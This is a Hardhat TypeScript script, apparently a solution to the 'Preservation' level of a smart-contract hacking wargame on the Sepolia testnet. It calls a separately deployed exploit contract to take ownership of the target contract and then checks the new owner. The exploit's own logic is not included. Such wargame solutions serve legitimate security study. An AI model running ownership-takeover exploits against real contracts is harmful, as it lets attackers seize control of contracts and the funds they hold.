import { ethers } from "hardhat";

/**
 * Execute the Preservation exploit to take ownership of the contract
 * 
 * Usage:
 * PRESERVATION_INSTANCE_ADDRESS=0xYourPreservationAddress PRESERVATION_SOLUTION_ADDRESS=0xYourExploitAddress npx hardhat run scripts/level-16-preservation/execute-preservation-exploit.ts --network sepolia
 */
async function main() {
  console.log("Executing Preservation exploit...");
  
  // Get the addresses from environment
  const preservationAddress = process.env.PRESERVATION_INSTANCE_ADDRESS;
  const exploitAddress = process.env.PRESERVATION_SOLUTION_ADDRESS;
  
  if (!preservationAddress || !exploitAddress) {
    throw new Error("Environment variables PRESERVATION_INSTANCE_ADDRESS and PRESERVATION_SOLUTION_ADDRESS must be set");
  }
  
  console.log(`Using Preservation instance at: ${preservationAddress}`);
  console.log(`Using PreservationExploit contract at: ${exploitAddress}`);
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}`);
  
  // Connect to the contracts
  const preservation = await ethers.getContractAt("Preservation", preservationAddress);
  const exploit = await ethers.getContractAt("PreservationExploit", exploitAddress);
  
  // Display the original owner
  const originalOwner = await preservation.owner();
  console.log(`Original owner of Preservation: ${originalOwner}`);
  
  // Execute the exploit
  console.log("Executing the exploit to take ownership...");
  const tx = await exploit.exploit();
  await tx.wait();
  console.log(`Exploit transaction hash: ${tx.hash}`);
  
  // Check if the exploit was successful
  const newOwner = await preservation.owner();
  console.log(`New owner of Preservation: ${newOwner}`);
  
  // Verify success
  const isSuccess = await exploit.checkSuccess();
  if (isSuccess) {
    console.log("✅ Success! The PreservationExploit contract is now the owner of the Preservation contract.");
  } else {
    console.log("❌ The exploit was not successful. The PreservationExploit contract is not the owner.");
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
